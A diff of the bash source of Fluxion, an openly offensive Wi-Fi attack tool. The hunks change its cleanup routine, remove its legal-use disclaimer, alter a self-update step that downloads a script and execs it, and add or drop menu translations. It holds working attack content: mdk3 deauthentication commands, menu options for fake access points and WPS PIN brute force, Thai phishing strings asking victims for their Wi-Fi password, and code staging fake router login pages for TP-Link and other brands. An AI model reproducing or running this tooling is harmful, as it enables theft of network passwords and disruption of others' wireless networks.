@@ -7,12 +7,12 @@ FLUX_DEBUG=0
 ################################
 
 if [[ $EUID -ne 0 ]]; then
-        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root.""\e[0m"""
+        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root."$transparent""
         exit 1
 fi
 
 if [ -z "${DISPLAY:-}" ]; then
-    echo -e "\e[1;31mThe script should be executed inside a X (graphical) session.""\e[0m"""
+    echo -e "\e[1;31mThe script should be executed inside a X (graphical) session."$transparent""
     exit 1
 fi
 
@@ -27,7 +27,7 @@ ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*)
 # Deauth duration during handshake capture
 # oo
 DEAUTHTIME="9999999999999"
-revision=105
+revision=98
 version=0.23
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -125,102 +125,93 @@ trap exitmode SIGINT SIGHUP
 
 # KILL ALL
 function exitmode {
-    if [ "$FLUX_DEBUG" != "1" ]; then
-        conditional_clear
-        top
-        echo -e "\n\n"$white"["$red"-"$white"] "$red"$general_exitmode"$transparent""
+	conditional_clear
+	top
+	echo -e "\n\n"$white"["$red"-"$white"] "$red"$general_exitmode"$transparent""
 
-        if ps -A | grep -q aireplay-ng; then
-            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"aireplay-ng"$transparent""
-            killall aireplay-ng &>$flux_output_device
-        fi
+	if ps -A | grep -q aireplay-ng; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"aireplay-ng"$transparent""
+		killall aireplay-ng &>$flux_output_device
+	fi
 
-        if ps -A | grep -q airodump-ng; then
-            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"airodump-ng"$transparent""
-            killall airodump-ng &>$flux_output_device
-        fi
+	if ps -A | grep -q airodump-ng; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"airodump-ng"$transparent""
+		killall airodump-ng &>$flux_output_device
+	fi
 
-        if ps a | grep python| grep fakedns; then
-            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"python"$transparent""
-            kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
-        fi
+	if ps a | grep python| grep fakedns; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"python"$transparent""
+		kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
+	fi
 
-        if ps -A | grep -q hostapd; then
-            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"hostapd"$transparent""
-            killall hostapd &>$flux_output_device
-        fi
+	if ps -A | grep -q hostapd; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"hostapd"$transparent""
+		killall hostapd &>$flux_output_device
+	fi
 
-        if ps -A | grep -q lighttpd; then
-            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"lighttpd"$transparent""
-            killall lighttpd &>$flux_output_device
-        fi
+	if ps -A | grep -q lighttpd; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"lighttpd"$transparent""
+		killall lighttpd &>$flux_output_device
+	fi
 
-        if ps -A | grep -q dhcpd; then
-            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"dhcpd"$transparent""
-            killall dhcpd &>$flux_output_device
-        fi
+	if ps -A | grep -q dhcpd; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"dhcpd"$transparent""
+		killall dhcpd &>$flux_output_device
+	fi
 
-        if ps -A | grep -q mdk3; then
-            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"mdk3"$transparent""
-            killall mdk3 &>$flux_output_device
-        fi
+	if ps -A | grep -q mdk3; then
+		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"mdk3"$transparent""
+		killall mdk3 &>$flux_output_device
+	fi
 
-        if [ "$WIFI_MONITOR" != "" ]; then
-            echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_1 "$green"$WIFI_MONITOR"$transparent""
-            ./airmon stop $WIFI_MONITOR &> $flux_output_device
-        fi
-
-
-        if [ "$WIFI" != "" ]; then
-            echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_2 "$green"$WIFI"$transparent""
-            ./airmon stop $WIFI &> $flux_output_device
-            ./airmon stop $WIFI_MONITOR1 &> $flux_output_device
-            ./airmon stop $WIFI_MONITOR2 &> $flux_output_device
-            ./airmon stop $WIFI_MONITOR3 &> $flux_output_device
-            ./airmon stop $WIFI_MONITOR4 &> $flux_output_device
-            ./airmon stop $WIFI_MONITOR5 &> $flux_output_device
-            macchanger -p $WIFI &> $flux_output_device
-        fi
+	if [ "$WIFI_MONITOR" != "" ]; then
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_1 "$green"$WIFI_MONITOR"$transparent""
+		./airmon stop $WIFI_MONITOR &> $flux_output_device
+	fi
 
 
-        if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
-            echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_3"$transparent""
-            sysctl -w net.ipv4.ip_forward=0 &>$flux_output_device
-        fi
+	if [ "$WIFI" != "" ]; then
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_2 "$green"$WIFI"$transparent""
+		./airmon stop $WIFI &> $flux_output_device
+		./airmon stop $WIFI_MONITOR1 &> $flux_output_device
+		./airmon stop $WIFI_MONITOR2 &> $flux_output_device
+		./airmon stop $WIFI_MONITOR3 &> $flux_output_device
+		./airmon stop $WIFI_MONITOR4 &> $flux_output_device
+		./airmon stop $WIFI_MONITOR5 &> $flux_output_device
+		macchanger -p $WIFI &> $flux_output_device
+	fi
 
-        echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_4"$transparent""
-        iptables --flush
-        iptables --table nat --flush
-        iptables --delete-chain
-        iptables --table nat --delete-chain
 
-        echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_5"$transparent""
-        tput cnorm
+	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
+		echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_3"$transparent""
+		sysctl -w net.ipv4.ip_forward=0 &>$flux_output_device
+	fi
 
-        if [ $FLUX_DEBUG != 1 ]; then
+	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_4"$transparent""
+	iptables --flush
+	iptables --table nat --flush
+	iptables --delete-chain
+	iptables --table nat --delete-chain
 
-            echo -e ""$white"["$red"-"$white"] "$white"Delete "$grey"files"$transparent""
-            rm -R $DUMP_PATH/* &>$flux_output_device
-        fi
+	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_5"$transparent""
+	tput cnorm
 
-        echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_6"$transparent""
-        # systemctl check
-        systemd=`whereis systemctl`
-        if [ "$systemd" = "" ];then
-            service network-manager restart &> $flux_output_device &
-            service networking restart &> $flux_output_device &
-            service restart networkmanager &> $flux_output_device &
-        else
-            systemctl restart NetworkManager &> $flux_output_device & 	
-            systemctl start NetworkManager &> $flux_output_device &
-        fi 
-        echo -e ""$white"["$green"+"$white"] "$green"$general_exitmode_7"$transparent""
-        echo -e ""$white"["$green"+"$white"] "$grey"$general_exitmode_8"$transparent""
-        sleep 2
-        clear
-    fi
-        exit
-    
+	if [ $FLUX_DEBUG != 1 ]; then
+
+		echo -e ""$white"["$red"-"$white"] "$white"Delete "$grey"files"$transparent""
+		rm -R $DUMP_PATH/* &>$flux_output_device
+	fi
+
+	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_6"$transparent""
+	service network-manager restart &> $flux_output_device &
+	service networking restart &> $flux_output_device &
+	service restart networkmanager &> $flux_output_device &
+	echo -e ""$white"["$green"+"$white"] "$green"$general_exitmode_7"$transparent""
+	echo -e ""$white"["$green"+"$white"] "$grey"$general_exitmode_8"$transparent""
+	sleep 2
+	clear
+	exit
+
 }
 
 
@@ -477,18 +468,6 @@ DIALOG_WEB_ERROR_MSG_DAN="Dette felt er obligatorisk"
 DIALOG_WEB_LDANHT_MIN_DAN="Netværksadgangskoden skal være på mere end {0} tegn!"
 DIALOG_WEB_LDANHT_MAX_DAN="Netværksadgangskoden skal være på mindre end {0} tegn!"
 DIALOG_WEB_DIR_DAN="ltr"
-
-#TH 
-DIALOG_WEB_INFO_TH="กรุณากรอกรหัสผ่าน WIFI เพื่อให้แน่ใจว่าท่านไม่ใช่ Robot ในการใช้งานอินเตอร์เน็ต."
-DIALOG_WEB_INPUT_TH="กรอกรหัสผ่าน WIFI ของท่าน:"
-DIALOG_WEB_SUBMIT_TH="ยืนยัน"
-DIALOG_WEB_ERROR_TH="เกิดข้อผิดพลาด: รหัสผ่านไม่ถูกต้อง"
-DIALOG_WEB_OK_TH="กรุณารอสักครู่..ระบบกำลังพาท่านไปยังเว็บไซต์ก่อนหน้า..."
-DIALOG_WEB_BACK_TH="กลับ"
-DIALOG_WEB_ERROR_MSG_TH="กรุณากรอกช่องนี้!"
-DIALOG_WEB_LTHHT_MIN_TH="รหัสผ่านควรมีมากกว่า {0} ตัวอักษร!"
-DIALOG_WEB_LTHHT_MAX_TH="รหัสผ่านควรมีอย่างน้อย {0} ตัวอักษร!"
-DIALOG_WEB_DIR_TH="ltr"
 
 # Design
 function top(){
@@ -773,8 +752,7 @@ fi
 
 
 if [ $FLUX_DEBUG != 1 ]; then
-	whiptail --title "Fluxion Disclaimer" --msgbox "Fluxion is intended to be used for legal security purposes only, and you should only use it to protect networks/hosts you own or have permission to test. Any other use is not the responsibility of the developer(s).  Be sure that you understand and are complying with the Fluxion licenses and laws in your area.  In other words, don't be stupid, don't be an asshole, and use this tool responsibly and legallys." 10 60
-	clear; echo ""
+	echo ""
 		   sleep 0.01 && echo -e "$red "
            sleep 0.01 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
            sleep 0.01 && echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "
@@ -801,12 +779,10 @@ if [ $FLUX_DEBUG != 1 ]; then
 			if [ "$revision" != "$revision_online" ]; then
 				echo
 				echo
-				echo -ne $red"            New revision found! "$yellow
-                echo -ne "Update? [Y/n]: "$transparent
-				read -N1 doupdate
+				echo -e $red"	   New revision found!" $blue "->"$yellow" Update? [ENTER=skip]"
+				read doupdate
 				echo -ne "$transparent"
-                doupdate=${doupdate:-"Y"}
-				if [ "$doupdate" = "Y" ]; then
+				if [ "$doupdate" != "" ]; then
 					cp $0 $HOME/flux_rev-$revision.backup
 					curl "https://raw.githubusercontent.com/deltaxflux/fluxion/master/fluxion" -s -o $0
 					echo
@@ -816,7 +792,6 @@ if [ $FLUX_DEBUG != 1 ]; then
 					sleep 3
 					chmod +x $0
 					exec $0
-                    exit
 				fi
 			fi
 		fi
@@ -944,6 +919,7 @@ function language {
 		echo -e "      "$red"["$yellow"7"$red"]"$transparent" Italian   "
 		echo -e "      "$red"["$yellow"8"$red"]"$transparent" Czech   "
 		echo -e "      "$red"["$yellow"9"$red"]"$transparent" Greek   "
+		echo -e "      "$red"["$yellow"10"$red"]"$transparent" Portuguese          "
 		echo "                                       "
 		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
@@ -958,6 +934,7 @@ function language {
 			7 ) italian; setinterface; break;;
 			8 ) czech; setinterface; break;;
 			9 ) greek; setinterface; break;;
+			10 ) portuguese; setinterface; break ;;
 			skip ) english; skipme; break;;
 			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
 		  esac
@@ -1452,6 +1429,58 @@ function greek {
 
 }
 
+function portuguese {
+	header_setinterface="Selecione uma Interface"
+	setinterface_error="Aqui não há dispositivos Wireless, Saindo..."
+
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_choosescan="Selecionar Canal"
+	choosescan_option_1="Todos os Canais "
+	choosescan_option_2="Canal Específico(s)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	scanchan_option_1="Apenas um canal"
+	scanchan_option_2="Multiplos canais"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_scan="WIFI Monitor"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_scanchan="Escaneando Alvo"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_askAP="Selecionar opção de ataque"
+	askAP_option_1="FakeAP - Hostapd ("$red"Recomendado)"
+	askAP_option_2="FakeAP - airbase-ng (Conexão Lenta)"
+	askAP_option_3="WPS-SLAUGHTER - WPS Pin com BRUTEFORCE"
+	askAP_option_4="Bruteforce - (Handshake é necessário)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_askauth="Método para verificar a senha"
+	askauth_option_1="Handshake ("$red"Recomendado)"
+	askauth_option_2="Wpa_supplicant(Muitas falhas)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_deauthforce="Checar Handshake"
+	deauthforce_option_1="aircrack-ng (Perdeu a chance)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_deauthMENU="*Capturar Handshake*"
+	deauthMENU_option_1="Checar Handshake"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_webinterface="Selecione sua opção"
+	header_ConnectionRESET="Selecionar Página de Login"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	general_back="Voltar"
+	general_error_1="Não Encontrado"
+	general_case_error="Opção desconhecida. Escolha novamente"
+	general_exitmode="Limpando e Fechando..."
+	general_exitmode_1="Desativando a interface de monitoramento"
+	general_exitmode_2="Desativando a interface"
+	general_exitmode_3="Desativando "$grey"Encaminhamento de pacotes"
+	general_exitmode_4="Limpando "$grey"iptables"
+	general_exitmode_5="Restaurando "$grey"tput"
+	general_exitmode_6="Reiniciando "$grey"Gerenciador de rede"
+	general_exitmode_7="Limpeza realizada com sucesso!"
+	general_exitmode_8="Obrigado por usar fluxion"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	selection_1="Clientes Ativos"
+	selection_2="Selecione o alvo. Para re-escanear digite$red r$transparent"
+	}
+
 # Choose Interface
 function setinterface {
 
@@ -1633,10 +1662,10 @@ function selection {
 		echo -n -e $transparent"Do you want exit? "$red"["$yellow"Y"$transparent"es / "$yellow"N"$transparent"o"$red"]"$transparent":"
 		read back
 		if [ $back = 'n' ] && [ $back = 'N' ] && [ $back = 'no' ] && [ $back = 'No' ];then
-			clear && exitmode
+			exitmode && break
 
 		elif [ $back = 'y' ] && [ $back = 'Y' ] && [ $back = 'yes' ] && [ $back = 'Yes' ];then
-			clear && setinterface
+			setinterface && break
 		fi
 
 	fi
@@ -2476,7 +2505,7 @@ menu
 ;;
 	1)
 clear
-timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 &  mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250
+timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR2 x 0 -t $mac -n $ssid -s 250 & timeout 20s mdk3 $WIFI_MONITOR3 x 0 -t $mac -n $ssid -s 250
 menu
 ;;
 	2)
@@ -3963,10 +3992,8 @@ function ConnectionRESET {
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Polish      [PL]   (NEUTRA)";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Indonesia   [ID]   (NEUTRA)";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Dutch       [NL]   (NEUTRA)";n=`expr $n + 1`
-	      	echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Danish      [DAN]  (NEUTRA)";n=`expr $n + 1`
-	      	echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Hebrew      [HE]  (NEUTRA)";n=`expr $n + 1`
-	      	echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Thailand     [TH]  (NEUTRA)";n=`expr $n + 1`
-	    	echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Belkin      [ENG]";n=`expr $n + 1`
+      echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Danish      [DAN]  (NEUTRA)";n=`expr $n + 1`
+    	echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Belkin      [ENG]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Netgear     [ENG]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Huawei      [ENG]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Verizon     [ENG]";n=`expr $n + 1`
@@ -3974,7 +4001,6 @@ function ConnectionRESET {
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Arris       [ESP]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Vodafone    [ESP]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" TP-Link     [ENG]";n=`expr $n + 1`
-			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" TP-Link     [ITA]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
 			echo
 			echo -n "#? "
@@ -4272,72 +4298,40 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-    			elif [ "$fluxass" = 22 ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_HE
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_HE
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_HE
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_HE
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_HE
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_HE
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_HE
-                                DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_HE
-                                DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_HE
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_HE
-                                NEUTRA
-                                break
-
-               elif [ "$fluxass" = 23 ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_TH
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_TH
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_TH
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_TH
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_TH
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_TH
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_TH
-                                DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_TH
-                                DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_TH
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_TH
-                                NEUTRA
-                                break
-
-			elif [ "$fluxass" = "24" ]; then
+			elif [ "$fluxass" = "22" ]; then
 				BELKIN
 				break
 
 
-			elif [ "$fluxass" = "25" ]; then
+			elif [ "$fluxass" = "23" ]; then
 				NETGEAR
 				break
 
-      elif [ "$fluxass" = "26" ]; then
+      elif [ "$fluxass" = "24" ]; then
 				HUAWEI
 				break
 
-			elif [ "$fluxass" = "27" ]; then
+			elif [ "$fluxass" = "25" ]; then
 				VERIZON
 				break
 
-			elif [ "$fluxass" = "28" ]; then
+			elif [ "$fluxass" = "26" ]; then
 				NETGEAR2
 				break
 
-			elif [ "$fluxass" = "29" ]; then
+			elif [ "$fluxass" = "27" ]; then
 				ARRIS2
 				break
 
-			elif [ "$fluxass" = "30" ]; then
+			elif [ "$fluxass" = "28" ]; then
 				VODAFONE
 				break
 
-			elif [ "$fluxass" = "31" ]; then
+			elif [ "$fluxass" = "29" ]; then
 				TPLINK
 				break
 
-			elif [ "$fluxass" = "32" ]; then
-				TPLINK_ITA
-				break
-
-      elif [ "$fluxass" = "33" ]; then
+      elif [ "$fluxass" = "30" ]; then
 				conditional_clear
 				webinterface
 				break
@@ -7253,19 +7247,6 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp  $WORK_DIR/Sites/Upgrade-TP-LINK/final.html $DUMP_PATH/data
         cp  $WORK_DIR/Sites/Upgrade-TP-LINK/error.html $DUMP_PATH/data
 }
-
-#Conten interface web
-function TPLINK_ITA {
-
-mkdir $DUMP_PATH/data &>$flux_output_device
-        cp  $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/bootstrap.min.css $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/bootstrap.min.js $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/index.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/jquery.min.js $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/final.html $DUMP_PATH/data
-        cp  $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/error.html $DUMP_PATH/data
-}
-
 
 #Conten interface web
 function VODAFONE {
